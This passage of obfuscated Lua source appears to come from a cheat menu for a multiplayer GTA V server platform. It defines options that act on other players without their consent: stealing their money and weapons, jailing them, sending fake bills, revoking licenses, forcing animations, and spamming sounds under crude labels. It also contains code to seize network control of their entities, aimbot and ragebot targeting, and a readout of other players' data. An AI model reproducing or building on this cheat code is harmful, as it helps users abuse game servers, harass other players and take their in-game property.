        for k,v in pairs(__REAPER1__.T.Display[dkey .. ':vehicle']) do
            if v.dkey then
                __REAPER1__.A[v.dkey] = v
            end
        end
        __REAPER1__.T.Display[dkey .. ':weapon'] = {
            {text = 'Give weapon', dkey = dkey .. 'w_giveweapon', desc = 'Give a chosen weapon to the player.', afu = __REAPER1__.M.oplayers.weapon.give, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Weapon name', length = 20, tipus = 'vegyes', func = __REAPER1__.T.Weapons, extra = id},
            {text = 'Give all', dkey = dkey .. 'w_giveall', desc = 'Give every weapon to the player.', afu = __REAPER1__.M.oplayers.weapon.giveall, option = __REAPER1__.M.Button, extra = id},
            {text = 'Spawn weapon', dkey = dkey .. 'w_spawnweapon', desc = 'Spawn a chosen weapon for the\nplayer.', afu = __REAPER1__.M.oplayers.weapon.spawn, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Weapon name', length = 30, tipus = 'vegyes', func = __REAPER1__.T.Weapons, extra = id},
            {text = 'Spawn all', dkey = dkey .. 'w_spawnall', desc = 'Spawn every weapon for the player.', afu = __REAPER1__.M.oplayers.weapon.spawnall, option = __REAPER1__.M.Button, extra = id},
            {text = 'Remove weapon', dkey = dkey .. 'w_removeweapon', desc = 'Remove a chosen weapon from the\nplayer.', afu = __REAPER1__.M.oplayers.weapon.remove, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Weapon name', length = 30, tipus = 'vegyes', func = __REAPER1__.T.Weapons, extra = id},
            {text = 'Remove current', dkey = dkey .. 'w_removecurrent', desc = 'Remove the current weapon of the\nplayer.', afu = __REAPER1__.M.oplayers.weapon.removec, option = __REAPER1__.M.Button, extra = id},
            {text = 'Remove all', dkey = dkey .. 'w_removeall', desc = 'Remove every weapon the player has.', afu = __REAPER1__.M.oplayers.weapon.removeall, option = __REAPER1__.M.Button, extra = id},
            {text = 'Ammo', dkey = dkey .. 'w_ammo', desc = 'Remove or give a weapon with this\nammo count.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo amount number', length = 5, tipus = 'szam', func = __REAPER1__.T.Tizezres, extra = id},
            {text = 'Exploding bullets', option = __REAPER1__.M.Separator},
            {text = 'Exploding bullets', dkey = dkey .. 'w_explode', desc = 'Enable exploding bullets for the player.', afu = __REAPER1__.M.oplayers.weapon.explodingbullets, option = __REAPER1__.M.Checkbox, fucn = false, extra = id},
            {text = 'Damage', dkey = dkey .. 'w_damage', desc = 'The damage of the explosion.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Explosion damage number', length = 4, tipus = 'szam', func = __REAPER1__.T.Ezres, extra = id},
            {text = 'Invisible', dkey = dkey .. 'w_invisible', desc = 'Make the explosion invisible.', option = __REAPER1__.M.Checkbox, func = false, extra = id},
            {text = 'Audible', dkey = dkey .. 'w_audible', desc = 'Make the explosion audible.', option = __REAPER1__.M.Checkbox, func = false, extra = id},
            {text = 'Misc', option = __REAPER1__.M.Separator},
            {text = 'Trace bullets', dkey = dkey .. 'w_tracebullets', desc = 'Enable the tracers for the player\'s\nbullets.', afu = __REAPER1__.M.oplayers.weapon.btracer, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Bullet tracer time number', length = 5, tipus = 'szam', toggle = false, func = __REAPER1__.T.Tizezres, extra = id},
            {text = 'Trace impacts', dkey = dkey .. 'w_traceimpacts', desc = 'Enable the tracers for the player\'s\nimpacts.', afu = __REAPER1__.M.oplayers.weapon.itracer, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Impact tracer time number', length = 5, tipus = 'szam', toggle = false, func = __REAPER1__.T.Tizezres, extra = id},
            {text = 'Cartoon gun', dkey = dkey .. 'w_cartoongun', desc = 'Enable the cartoon gun for the player.', afu = __REAPER1__.M.oplayers.weapon.cartoon, option = __REAPER1__.M.Checkbox, func = false, extra = id},
        }
        for k,v in pairs(__REAPER1__.T.Display[dkey .. ':weapon']) do
            if v.dkey then
                __REAPER1__.A[v.dkey] = v
            end
        end
        __REAPER1__.T.Display[dkey .. ':sound'] = {
            {text = 'Play sound', dkey = dkey .. 's_playsound', desc = 'Play a chosen sound on the player.', afu = __REAPER1__.M.oplayers.sound.sound, option = __REAPER1__.M.Button, extra = id},
            {text = 'Loop sound', dkey = dkey .. 's_loopsound', desc = 'Loop a chosen sound on the player.', afu = __REAPER1__.M.oplayers.sound.soundl, option = __REAPER1__.M.Checkbox, func = false, extra = id},
            {text = 'Delay', dkey = dkey .. 's_delay', desc = 'The delay between the sounds in\nthe loop.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Sound delay', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval, extra = id},
            {text = 'Type', dkey = dkey .. 's_type', desc = 'The sound to play.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Sound type', length = 10, tipus = 'betu', func = {'Beep', 'Screen sound','Bulldozer','Beep 2','Beep 3','Counter','Beep 4','Death screen','Beep 5','Challange unlocked','Checkpoint','Stun','Radio','Beep 6','Waypoint', 'Spawn','Text','Beep 7','Power down','Beep 8','Camera','Fail','Fail 2'}, extra = id},
            {text = 'Sound rape', dkey = dkey .. 's_soundrape', desc = 'Toggle the sound raping with normal\nsounds.', afu = __REAPER1__.M.oplayers.sound.soundr, option = __REAPER1__.M.Checkbox, func = false, extra = id},
            {text = 'Sound rape 2', dkey = dkey .. 's_soundrape2', desc = 'Toggle the sound raping with\nexplosions.', afu = __REAPER1__.M.oplayers.sound.soundr2, option = __REAPER1__.M.Checkbox, func = false, extra = id, risky = true},
        }
        for k,v in pairs(__REAPER1__.T.Display[dkey .. ':sound']) do
            __REAPER1__.A[v.dkey] = v
        end
        __REAPER1__.T.Display[dkey .. ':trigger'] = {
            {text = 'Animation', dkey = dkey .. 't_animation', desc = 'Force the player to play an animation.', afu = __REAPER1__.M.oplayers.trigger.anim, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Animation type', length = 15, tipus = 'betu', func = {'Dance', 'Punched', 'Slapped', 'Hug', 'Glowstick', 'Horse'}, extra = id, risky = true},
            {text = 'Steal money', dkey = dkey .. 't_stealmoney', desc = 'Steal the an amount of money from\nthe player\'s inventory.', afu = __REAPER1__.M.oplayers.trigger.stealm, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Money amount number', length = 20, tipus = 'szam', func = 0, extra = id},
            {text = 'Steal weapon', dkey = dkey .. 't_stealweapon', desc = 'Setal a weapon from the player\'s\ninventory.', afu = __REAPER1__.M.oplayers.trigger.stealwep, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Weapon name to steal', length = 20, tipus = 'betu', func = 'None', extra = id},
            {text = 'Jail', dkey = dkey .. 't_jail', desc = 'Jail the player for a specified amount\nof time.', afu = __REAPER1__.M.oplayers.trigger.jail, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Jail time number', length = 20, tipus = 'szam', func = 0, extra = id},
            {text = 'Bill', dkey = dkey .. 't_bill', desc = 'Send a bill to the player with a specified\nname and amount. Format: NAME AMOUNT', afu = __REAPER1__.M.oplayers.trigger.bill, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Bill name and amount', length = 30, tipus = 'vegyes', func = 'bill 0', extra = id},
            {text = 'Community servive', dkey = dkey .. 't_commserver', desc = 'Put the player into community\nservice.', afu = __REAPER1__.M.oplayers.trigger.commserv, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Community service amount number', length = 20, tipus = 'szam', func = 0, extra = id},
            {text = 'Release comm. serv.', dkey = dkey .. 't_rcommserver', desc = 'Release the player from community service.', afu = __REAPER1__.M.oplayers.trigger.rcommserv, option = __REAPER1__.M.Button, extra = id},
            {text = 'Message', dkey = dkey .. 't_message', desc = 'Message the player with a notification.', afu = __REAPER1__.M.oplayers.trigger.message, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Message text', length = 40, tipus = 'vegyes', func = 0, extra = id},
            {text = 'Carry', dkey = dkey .. 't_carry', desc = 'Carry the player with a chosen animation\nset.', afu = __REAPER1__.M.oplayers.trigger.carry, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Carry animation', length = 10, tipus = 'betu', func = {'Default', 'Secks', 'Weird'}, extra = id},
            {text = 'Take hostage', dkey = dkey .. 't_takehostage', desc = 'Take hostage the player with a chosen\nanimation set.', afu = __REAPER1__.M.oplayers.trigger.th, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Take hostage animation', length = 10, tipus = 'betu', func = {'Default', 'Secks', 'Weird'}, extra = id},
            {text = 'Piggyback', dkey = dkey .. 't_piggyback', desc = 'Piggyback the player with a chosen\nanimation set.', afu = __REAPER1__.M.oplayers.trigger.piggy, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Piggyback animation', length = 10, tipus = 'betu', func = {'Default', 'Secks', 'Weird'}, extra = id},
            {text = 'Remove license', dkey = dkey .. 't_removelicense', desc = 'Remove a specified license from the\nplayer.', afu = __REAPER1__.M.oplayers.trigger.license, option = __REAPER1__.M.Button_Textbox, textboxtext = 'License name', length = 20, tipus = 'vegyes', func = '', extra = id},
            {text = 'Play sound', dkey = dkey .. 't_playsound', desc = 'Play a sound file on the player.', afu = __REAPER1__.M.oplayers.trigger.sound, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Sound file name', length = 10, tipus = 'betu', func = {'Demo', 'Seatbelt', 'Unlock', 'Lock', 'Seatbeltoff', 'Cell', 'Handcuff', 'Buckle'}, extra = id},
            {text = 'Custom sound', dkey = dkey .. 't_customsound', desc = 'Only works with youtube, you have to\ntype in the part after = in the link.', afu = __REAPER1__.M.oplayers.trigger.csound, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Youtube link', length = 30, tipus = 'vegyes', func = '', extra = id},
        }
        for k,v in pairs(__REAPER1__.T.Display[dkey .. ':trigger']) do
            __REAPER1__.A[v.dkey] = v
        end
        __REAPER1__.T.Display[dkey .. ':particle'] = {
            {text = 'Play particle', dkey = dkey .. 'p_particle', desc = 'Play a chosen particle on the player.', afu = __REAPER1__.M.oplayers.particle.play, option = __REAPER1__.M.Button, extra = id},
            {text = 'Loop particle', dkey = dkey .. 'p_loopparticle', desc = 'Loop a chosen particle on the player.', afu = __REAPER1__.M.oplayers.particle.lplay, option = __REAPER1__.M.Checkbox, fucn = false, extra = id},
            {text = 'Type', dkey = dkey .. 'p_type', desc = 'Choose a particle type.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Particle type', length = 10, tipus = 'betu', func = __REAPER1__.T.MParticles, extra = id},
            {text = 'Scale', dkey = dkey .. 'p_scale', desc = 'The particle scale.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Particle scale number', length = 3, tipus = 'szam', func = __REAPER1__.T.Szazas, extra = id},
            {text = 'Delay', dkey = dkey .. 'p_delay', desc = 'The particle delay in looping.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Particle delay number', length = 4, tipus = 'szam', func = __REAPER1__.T.Ezres, extra = id},
            {text = 'Rotation', dkey = dkey .. 'p_rotation', desc = 'The particle rotation.', option = __REAPER1__.M.Button_Textbox, textboxtext = 'Particle rotation number', length = 20, tipus = 'vegyes', func = '0.0 0.0 0.0', extra = id},
            {text = 'Axis', dkey = dkey .. 'p_axis', desc = 'The particle axis.', option = __REAPER1__.M.Button_Textbox, textboxtext = 'Particle axis number', length = 20, tipus = 'vegyes', func = '0.0 0.0 0.0', extra = id},
        }
        for k,v in pairs(__REAPER1__.T.Display[dkey .. ':particle']) do
            __REAPER1__.A[v.dkey] = v
        end
        __REAPER1__.T.Display[dkey .. ':attach'] = {
            {text = 'Flag EU', dkey = dkey .. 'a_euflag', desc = 'Attach a eu flag to the player.', afu = __REAPER1__.M.oplayers.attach.attach, option = __REAPER1__.M.Button, extra = id, extra2 = `apa_prop_flag_eu_yt`},
            {text = 'Flag German', dkey = dkey .. 'a_germanflag', desc = 'Attach a german flag to the player.', afu = __REAPER1__.M.oplayers.attach.attach, option = __REAPER1__.M.Button, extra = id, extra2 = `apa_prop_flag_german_yt`},
            {text = 'Flag Russian', dkey = dkey .. 'a_russianflag', desc = 'Attach a russian flag to the player.', afu = __REAPER1__.M.oplayers.attach.attach, option = __REAPER1__.M.Button, extra = id, extra2 = `apa_prop_flag_russia_yt`},
            {text = 'Flag UK', dkey = dkey .. 'a_ukflag', desc = 'Attach a uk flag to the player.', afu = __REAPER1__.M.oplayers.attach.attach, option = __REAPER1__.M.Button, extra = id, extra2 = `apa_prop_flag_uk_yt`},
            {text = 'Flag US', dkey = dkey .. 'a_usflag', desc = 'Attach a us flag to the player.', afu = __REAPER1__.M.oplayers.attach.attach, option = __REAPER1__.M.Button, extra = id, extra2 = `apa_prop_flag_us_yt`},
            {text = 'Flag Hungarian', dkey = dkey .. 'a_hunflag', desc = 'Attach a hungarian flag to the player.', afu = __REAPER1__.M.oplayers.attach.attach, option = __REAPER1__.M.Button, extra = id, extra2 = `apa_prop_flag_hungary`},
            {text = 'Flag French', dkey = dkey .. 'a_frenchflag', desc = 'Attach a french flag to the player.', afu = __REAPER1__.M.oplayers.attach.attach, option = __REAPER1__.M.Button, extra = id, extra2 = `apa_prop_flag_france`},
            {text = 'Body parts', dkey = dkey .. 'a_bodyparts', desc = 'Attach body parts to the player.', afu = __REAPER1__.M.oplayers.attach.attach, option = __REAPER1__.M.Button, extra = id, extra2 = `v_ilev_body_parts`},
            {text = 'Ball', dkey = dkey .. 'a_ball', desc = 'Attach a ball to the player.', afu = __REAPER1__.M.oplayers.attach.attach, option = __REAPER1__.M.Button, extra = id, extra2 = `v_ilev_exball_blue`},
            {text = 'Snowman', dkey = dkey .. 'a_snowman', desc = 'Attach a snowman to the player.', afu = __REAPER1__.M.oplayers.attach.attach, option = __REAPER1__.M.Button, extra = id, extra2 = `prop_prlg_snowpile`},
            {text = 'Safe', dkey = dkey .. 'a_safe', desc = 'Attach a safe to the player.', afu = __REAPER1__.M.oplayers.attach.attach, option = __REAPER1__.M.Button, extra = id, extra2 = `p_v_43_safe_s`},
            {text = 'Windmill', dkey = dkey .. 'a_windmill', desc = 'Attach a windmill to the player.', afu = __REAPER1__.M.oplayers.attach.attach, option = __REAPER1__.M.Button, extra = id, extra2 = `prop_windmill_01`},
            {text = 'UFO', dkey = dkey .. 'a_ufo', desc = 'Attach a ufo to the player.', afu = __REAPER1__.M.oplayers.attach.attach, option = __REAPER1__.M.Button, extra = id, extra2 = `imp_prop_ship_01a`},
            {text = 'Alien egg', dkey = dkey .. 'a_alienegg', desc = 'Attach a alien egg to the player.', afu = __REAPER1__.M.oplayers.attach.attach, option = __REAPER1__.M.Button, extra = id, extra2 = `prop_alien_egg_01`},
        }
        for k,v in pairs(__REAPER1__.T.Display[dkey .. ':attach']) do
            __REAPER1__.A[v.dkey] = v
        end
    end

    __REAPER1__.F.DrawTheScaleform = function(type)
        if not __REAPER1__.N.HasScaleformLoaded(__REAPER1__.V.Scaleform) then
            __REAPER1__.V.Scaleform = __REAPER1__.N.RequestScaleform("INSTRUCTIONAL_BUTTONS")
        end

        __REAPER1__.N.BeginScaleform(__REAPER1__.V.Scaleform, "CLEAR_ALL")
        __REAPER1__.N.EndScaleformMovieMethod()

        if type == 1 then
            for k,v in ipairs(__REAPER1__.T.FreecamScaleform[__REAPER1__.V.FreecamMode]) do
                __REAPER1__.N.CreateScaleform(k - 1, v.button, v.label, v.button2 and v.button2 or nil)
            end
        elseif not __REAPER1__.M.TextboxWriting and not __REAPER1__.M.Picking then
            __REAPER1__.N.CreateScaleform(0, '~INPUT_DETONATE~', 'Toggle cursor')
        end
        
        __REAPER1__.N.BeginScaleform(__REAPER1__.V.Scaleform, "DRAW_INSTRUCTIONAL_BUTTONS")
        __REAPER1__.N.ScaleformAddParamInt(-1)
        __REAPER1__.N.EndScaleformMovieMethod()

        __REAPER1__.N.DrawScaleformMovieFullscreen(__REAPER1__.V.Scaleform, 255, 255, 255, 255)
    end

    __REAPER1__.F.NetControl = function(entity)
        if __REAPER1__.N.DoesEntityExist(entity) and __REAPER1__.N.NetworkGetEntityIsNetworked(entity) then
            if not __REAPER1__.N.NetworkHasControlOfEntity(entity) then
                __REAPER1__.N.NetworkSetChoiceMigrateOptions(true, __REAPER1__.V.SelfPlayerId)
                local netid = __REAPER1__.N.NetworkGetNetworkIdFromEntity(entity)

                __REAPER1__.N.NetworkRequestControlOfNetworkId(netid)

                __REAPER1__.N.SetNetworkIdExistsOnAllMachines(netid, true)
                __REAPER1__.N.SetNetworkIdCanMigrate(netid, false)

                __REAPER1__.N.NetworkRequestControlOfEntity(__REAPER1__.N.NetToEnt(netid))
                local timer = 0
                while not __REAPER1__.N.NetworkHasControlOfEntity(__REAPER1__.N.NetToEnt(netid)) do
                    __REAPER26__(100)
                    timer = timer + 1
                    if timer > 20 or not __REAPER1__.N.NetworkGetEntityIsNetworked(entity) then
                        return false
                    end
                end
            end

            return true
        end
    end

    __REAPER1__.F.RequestEntity = function(hash)
        if not __REAPER1__.N.HasModelLoaded(hash) then
            local timer = 0
            __REAPER1__.N.RequestModel(hash)
            while not __REAPER1__.N.HasModelLoaded(hash) do
                __REAPER26__(100)
                timer = timer + 1
                if timer > 50 then
                    __REAPER1__.N.SetModelAsNoLongerNeeded(hash)
                    return false
                end
            end
            __REAPER1__.N.SetModelAsNoLongerNeeded(hash)
        end
        return true
    end

    __REAPER1__.F.RequestAnimDict = function(dict)
        if not __REAPER1__.N.HasAnimDictLoaded(dict) then
            local timer = 0
            __REAPER1__.N.RequestAnimDict(dict)
            while not __REAPER1__.N.HasAnimDictLoaded(dict) do
                __REAPER26__(100)
                timer = timer + 1
                if timer > 50 then
                    __REAPER1__.N.RemoveAnimDict(dict)
                    return false
                end
            end
            __REAPER1__.N.RemoveAnimDict(dict)
        end
        return true
    end

    __REAPER1__.F.RequestAnimSet = function(set)
        if not __REAPER1__.N.HasAnimSetLoaded(set) then
            local timer = 0
            __REAPER1__.N.RequestAnimSet(set)
            while not __REAPER1__.N.HasAnimSetLoaded(set) do
                __REAPER26__(100)
                timer = timer + 1
                if timer > 50 then
                    __REAPER1__.N.RemoveAnimSet(set)
                    return false
                end
            end
            __REAPER1__.N.RemoveAnimSet(set)
        end
        return true
    end

    __REAPER1__.F.RequestWeaponAsset = function(asset)
        if not __REAPER1__.N.HasWeaponAssetLoaded(asset) then
            local timer = 0
            __REAPER1__.N.RequestWeaponAsset(asset, 31, 0)
            while not __REAPER1__.N.HasWeaponAssetLoaded(asset) do
                __REAPER26__(100)
                timer = timer + 1
                if timer > 50 then
                    __REAPER1__.N.RemoveWeaponAsset(asset)
                    return false
                end
            end
            __REAPER1__.N.RemoveWeaponAsset(asset)
        end
        return true
    end

    __REAPER1__.F.TlistCheck = function(ent, tipus)
        for k,v in ipairs(__REAPER1__.T.Display['server:targetinglist:targetedplayers']) do
            v = __REAPER1__.N.GetPlayerPed(__REAPER1__.N.GetPlayerFromServerId(v.extra))
            if tipus and (__REAPER1__.A[tipus].sindex == 1 and v ~= ent or v == ent) or v == ent then
                return true
            end
        end

        return false
    end

    __REAPER1__.F.ClosestEntity = function(tipus, me, ctipus, bone)
        local dist, ent, c, esx, esy, ret = 100000, nil, __REAPER1__.N.GetEntityCoords(__REAPER1__.V.SelfPed), sx, sy, nil
        for k,v in pairs(tipus == 'ped' and __REAPER1__.N.GameTable('CPed') or tipus == 'player' and __REAPER1__.N.GetActivePlayers() or tipus == 'vehicle' and __REAPER1__.N.GameTable('CVehicle')) do
            if tipus == 'player' then v = __REAPER1__.N.GetPlayerPed(v) end
            if me or (__REAPER1__.N.IsPedInAnyVehicle(__REAPER1__.V.SelfPed) and v ~= __REAPER1__.N.GetVehiclePedIsIn(__REAPER1__.V.SelfPed, false) or v ~= __REAPER1__.V.SelfPed) then
                if ctipus == 'aimbot' then
                    local hp = __REAPER1__.N.GetEntityHealth(v)
                    local dista = #(c - __REAPER1__.N.GetEntityCoords(v))
                    if (__REAPER1__.A['combat:aimbot_target'].sindex == 2 or __REAPER1__.N.IsEntityOnScreen(v)) and hp > 100 and (__REAPER1__.A['combat:aimbot_vehicles'].func or not __REAPER1__.A['combat:aimbot_vehicles'].func and not __REAPER1__.N.IsPedInAnyVehicle(v)) and
                    (__REAPER1__.A['combat:aimbot_maxdamage'].toggle and hp - __REAPER1__.A['combat:aimbot_maxdamage'].sindex < hp or not __REAPER1__.A['combat:aimbot_maxdamage'].toggle) and (__REAPER1__.A['combat:aimbot_distancetype'].sindex == 1 or __REAPER1__.A['combat:aimbot_distancetype'].sindex == 2 and dista <= __REAPER1__.A['combat:aimbot_distance'].sindex or __REAPER1__.A['combat:aimbot_distancetype'].sindex == 3 and dista <= __REAPER1__.N.GetMaxRangeOfCurrentPedWeapon(__REAPER1__.V.SelfPed)) and (not __REAPER1__.A['combat:aimbot_occluded'].func and __REAPER1__.N.HasEntityClearLosToEntity(__REAPER1__.V.SelfPed, v, 435) or __REAPER1__.A['combat:aimbot_occluded'].func) and
                    (__REAPER1__.A['combat:aimbot_targetinvisible'].func or __REAPER1__.N.IsEntityVisible(v) and __REAPER1__.N.GetEntityAlpha(v) == 255) then
                        if __REAPER1__.A['combat:aimbot_target'].sindex == 1 then
                            if dista < dist then
                                if not __REAPER1__.A['combat:aimbot_targetinglist'].toggle or __REAPER1__.F.TlistCheck(v, 'combat:aimbot_targetinglist') then
                                    dist, ent = dista, v
                                end
                            end
                        else
                            local tc = __REAPER1__.N.GetPedBoneCoords(v, bone)
                            local ret, sx, sy = __REAPER1__.N.GetScreenCoordFromWorldCoord(tc.x, tc.y, tc.z)
                            local diffx = math.abs(0.5 - sx)
                            local diffy = math.abs(0.5 - sy)
                            local dista = diffx + diffy

                            if dista < dist then
                                if not __REAPER1__.A['combat:aimbot_targetinglist'].toggle or __REAPER1__.F.TlistCheck(v, 'combat:aimbot_targetinglist') then
                                    dist, ent, esx, esy = dista, v, sx, sy
                                end
                            end
                        end
                    end
                elseif ctipus == 'ragebot' then
                    local dista = #(c - __REAPER1__.N.GetEntityCoords(v))
                    if dista < dist then
                        if v ~= __REAPER1__.V.SelfPed and __REAPER1__.N.GetEntityHealth(v) > 100 and (not __REAPER1__.A['combat:ragebot_vehicles'].func and not __REAPER1__.N.IsPedInAnyVehicle(v, false) or __REAPER1__.A['combat:ragebot_vehicles'].func) and (__REAPER1__.A['combat:ragebot_distance'].toggle and dista <= __REAPER1__.A['combat:ragebot_distance'].sindex or not __REAPER1__.A['combat:ragebot_distance'].toggle) and (not __REAPER1__.A['combat:ragebot_occluded'].func and __REAPER1__.N.HasEntityClearLosToEntity(__REAPER1__.V.SelfPed, v, 435) or __REAPER1__.A['combat:ragebot_occluded'].func) then
                            if not __REAPER1__.A['combat:ragebot_targetinglist'].toggle or __REAPER1__.F.TlistCheck(v, 'combat:ragebot_targetinglist') then
                                dist, ent = dista, v
                            end
                        end
                    end
                else
                    local dista = #(c - __REAPER1__.N.GetEntityCoords(v))
                    if dista < dist then
                        dist, ent = dista, v
                    end
                end
            end
        end

        if ctipus == 'aimbot' then
            if __REAPER1__.A['combat:aimbot_lockon'].func then
                if not __REAPER1__.V.AimbotLockTarget then
                    __REAPER1__.V.AimbotLockTarget = ent
                end

                return __REAPER1__.V.AimbotLockTarget
            else
                return ent, esx, esy
            end
        else
            return ent
        end
    end

    __REAPER1__.F.RequestSkin = function(propid, tabla, tabla2, tipus)
        if tipus == 'prop' then
            local prop = __REAPER1__.N.GetNumberOfPedPropDrawableVariations(__REAPER1__.V.SelfPed, propid)
            if prop ~= 0 then
                local t = {}
                for i = 0, prop - 1 do
                    table.insert(t, i)
                end
                __REAPER1__.A[tabla].func = t

                local texture = __REAPER1__.N.GetNumberOfPedPropTextureVariations(__REAPER1__.V.SelfPed, propid, 0)
                if texture ~= 0 then
                    local t = {}
                    for i = 0, texture - 1 do
                        table.insert(t, i)
                    end
                    __REAPER1__.A[tabla2].func = t
                else
                    __REAPER1__.A[tabla2].func = {'None'}
                end
            else
                __REAPER1__.A[tabla].func = {'None'}
            end
            __REAPER1__.A[tabla].sindex, __REAPER1__.A[tabla].cindex = 1, 1
            __REAPER1__.A[tabla2].sindex, __REAPER1__.A[tabla].cindex = 1, 1
        else
            local comp = __REAPER1__.N.GetNumberOfPedDrawableVariations(__REAPER1__.V.SelfPed, propid)
            if comp ~= 0 then
                local t = {}
                for i = 0, comp - 1 do
                    table.insert(t, i)
                end
                __REAPER1__.A[tabla].func = t

                local texture = __REAPER1__.N.GetNumberOfPedTextureVariations(__REAPER1__.V.SelfPed, propid, 0)
                if texture ~= 0 then
                    local t = {}
                    for i = 0, texture - 1 do
                        table.insert(t, i)
                    end
                    __REAPER1__.A[tabla2].func = t
                else
                    __REAPER1__.A[tabla2].func = {'None'}
                end
            else
                __REAPER1__.A[tabla].func = {'None'}
            end
            __REAPER1__.A[tabla].sindex, __REAPER1__.A[tabla].cindex = 1, 1
            __REAPER1__.A[tabla2].sindex, __REAPER1__.A[tabla].cindex = 1, 1
        end
    end

    __REAPER1__.F.DrawPlayerData = function(menu)
        local xpos, ypos, xwidth = __REAPER1__.A['settings_positionx'].func[__REAPER1__.A['settings_positionx'].sindex - 1], __REAPER1__.A['settings_positiony'].func[__REAPER1__.A['settings_positiony'].sindex - 1] + __REAPER1__.M.PDatay, __REAPER1__.A['settings_widthx'].func[__REAPER1__.A['settings_widthx'].sindex - 1]
        local id = __REAPER1__.N.GetPlayerFromServerId(tonumber(string.sub(menu, 1, string.find(menu, ':', 1, true) - 1)))
        local ped = __REAPER1__.N.GetPlayerPed(id)
        local menux = xpos + xwidth + 0.008 + __REAPER1__.M.PDatax
        local coords = __REAPER1__.N.GetEntityCoords(ped)
        local fegyobool, fegyo = __REAPER1__.N.GetCurrentPedWeapon(ped, 1)
        local car = __REAPER1__.N.GetVehicleName(__REAPER1__.N.GetVehiclePedIsIn(ped, 1))
        if __REAPER1__.N.GetGameTimer() >= (__REAPER1__.V.DPlyTimer or 0) then
            __REAPER1__.V.DPlyCoords = coords
            __REAPER1__.V.DPlyHeading = __REAPER1__.N.GetEntityHeading(ped)
            __REAPER1__.V.DPlyTimer = __REAPER1__.N.GetGameTimer() + 300
        end
    
        __REAPER1__.F.DrawText(__REAPER1__.N.GetPlayerName(id), xpos + xwidth + 0.01 + __REAPER1__.M.PDatax, ypos - 0.092, 6, 255, 255, 255, 255, 0.55)
        __REAPER1__.F.DrawText('Position', menux, ypos - 0.045, 0, 255, 255, 255, 255, 0.26)
        __REAPER1__.F.DrawText('Distance', menux, ypos - 0.025, 0, 255, 255, 255, 255, 0.26)
        __REAPER1__.F.DrawText('Status', menux, ypos - 0.005, 0, 255, 255, 255, 255, 0.26)
        __REAPER1__.F.DrawText('Gender', menux, ypos + 0.015, 0, 255, 255, 255, 255, 0.26)
        __REAPER1__.F.DrawText('Custom Ped', menux, ypos + 0.035, 0, 255, 255, 255, 255, 0.26)
        __REAPER1__.F.DrawText('Street', menux, ypos + 0.055, 0, 255, 255, 255, 255, 0.26)
        __REAPER1__.F.DrawText('Zone', menux, ypos + 0.075, 0, 255, 255, 255, 255, 0.26)
        __REAPER1__.F.DrawText('Shooting', menux, ypos + 0.095, 0, 255, 255, 255, 255, 0.26)
        __REAPER1__.F.DrawText('Weapon', menux, ypos + 0.115, 0, 255, 255, 255, 255, 0.26)
        __REAPER1__.F.DrawText('Vehicle', menux, ypos + 0.135, 0, 255, 255, 255, 255, 0.26)
        __REAPER1__.F.DrawText('Last Vehicle', menux, ypos + 0.155, 0, 255, 255, 255, 255, 0.26)
        __REAPER1__.F.DrawText('Speed', menux, ypos + 0.175, 0, 255, 255, 255, 255, 0.26)
        __REAPER1__.F.DrawText('Ragdoll', menux, ypos + 0.195, 0, 255, 255, 255, 255, 0.26)
        
        __REAPER1__.F.DrawText('Player Id', menux, ypos + 0.215, 0, 255, 255, 255, 255, 0.26)
        __REAPER1__.F.DrawText('Server Id', menux, ypos + 0.235, 0, 255, 255, 255, 255, 0.26)
        __REAPER1__.F.DrawText('Ped Id', menux, ypos + 0.255, 0, 255, 255, 255, 255, 0.26)
        __REAPER1__.F.DrawText('Heading', menux, ypos + 0.275, 0, 255, 255, 255, 255, 0.26)
    
        __REAPER1__.F.DrawText('~c~|', xpos + xwidth + 0.09 + __REAPER1__.M.PDatax, ypos + 0.215, 0, 255, 255, 255, 255, 0.26)
        __REAPER1__.F.DrawText('~c~|', xpos + xwidth + 0.09 + __REAPER1__.M.PDatax, ypos + 0.235, 0, 255, 255, 255, 255, 0.26)
        __REAPER1__.F.DrawText('~c~|', xpos + xwidth + 0.09 + __REAPER1__.M.PDatax, ypos + 0.255, 0, 255, 255, 255, 255, 0.26)
        __REAPER1__.F.DrawText('~c~|', xpos + xwidth + 0.09 + __REAPER1__.M.PDatax, ypos + 0.275, 0, 255, 255, 255, 255, 0.26)
    
        __REAPER1__.F.DrawText('Health', xpos + xwidth + 0.095 + __REAPER1__.M.PDatax, ypos + 0.215, 0, 255, 255, 255, 255, 0.26)
        __REAPER1__.F.DrawText('Armor', xpos + xwidth + 0.095 + __REAPER1__.M.PDatax, ypos + 0.235, 0, 255, 255, 255, 255, 0.26)
        __REAPER1__.F.DrawText('God', xpos + xwidth + 0.095 + __REAPER1__.M.PDatax, ypos + 0.255, 0, 255, 255, 255, 255, 0.26)
        __REAPER1__.F.DrawText('Visible', xpos + xwidth + 0.095 + __REAPER1__.M.PDatax, ypos + 0.275, 0, 255, 255, 255, 255, 0.26)
        

